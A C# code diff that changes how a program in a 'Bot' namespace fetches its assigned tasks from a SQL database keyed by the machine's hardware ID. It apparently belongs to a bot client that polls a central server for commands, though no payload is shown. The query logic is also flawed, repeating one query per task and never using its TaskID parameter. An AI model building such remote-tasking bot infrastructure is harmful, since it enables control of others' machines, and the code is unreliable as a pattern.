@@ -104,41 +104,65 @@ namespace Bot.Classes
             }
         }
 
-        public static int getCTask()
+        public static string getCtaskString()
         {
             using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
             {
                 conn.Open();
-                int CTask = 0;
-                try
+                string CTaskString = "";
+                using (SqlCommand cmd = new SqlCommand("SELECT CTask FROM bots WHERE HWID = @HWID", conn))
                 {
-                    using (SqlCommand cmd = new SqlCommand("SELECT CTask from bots where HWID = @HWID;", conn))
-                    {
-                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-                        CTask = Convert.ToInt32(cmd.ExecuteScalar());
-                    }
+                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
+                    CTaskString = (string)cmd.ExecuteScalar();
                 }
-                catch { }
-                return CTask;
+                return CTaskString;
             }
         }
 
-        public static int getTaskID()
+        public static string[] getCTasks()
         {
             using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
             {
                 conn.Open();
-                int TaskID = 0;
+                string[] CTask = getCtaskString().Split(';');
+                return CTask;
+            }   
+        }
+
+        public static int getTaskAmount()
+        {
+            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
+            {
+                conn.Open();
+                int TaskAmount = 0;
+                using (SqlCommand cmd = new SqlCommand("SELECT TaskAmount FROM bots where HWID = @HWID", conn))
+                {
+                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
+                    TaskAmount = (int)cmd.ExecuteScalar();
+                }
+                return TaskAmount;
+            }
+        }
+
+        public static int[] getTaskID()
+        {
+            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
+            {
+                conn.Open();
+                int[] TaskID = new int[getTaskAmount() + 1];
+                for(int i = 1;i <= getTaskAmount();i++)
+                {
                     using (SqlCommand cmd = new SqlCommand("SELECT TaskID from Tasks where HWID = @HWID;", conn))
                     {
                         cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-                        TaskID = Convert.ToInt32(cmd.ExecuteScalar());
+                        TaskID[i] = Convert.ToInt32(cmd.ExecuteScalar());
                     }
+                }
                 return TaskID;
             }
         }
 
-        public static string getTask()
+        public static string getTask(int i)
         {
             using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
             {
@@ -147,7 +171,7 @@ namespace Bot.Classes
                 using (SqlCommand cmd = new SqlCommand("SELECT Type from Tasks where HWID = @HWID;", conn))
                 {
                     cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-                    cmd.Parameters.AddWithValue("TaskID", getTaskID());
+                    cmd.Parameters.AddWithValue("TaskID", getTaskID()[i]);
                     Type = cmd.ExecuteScalar().ToString();
                 }
                 return Type;
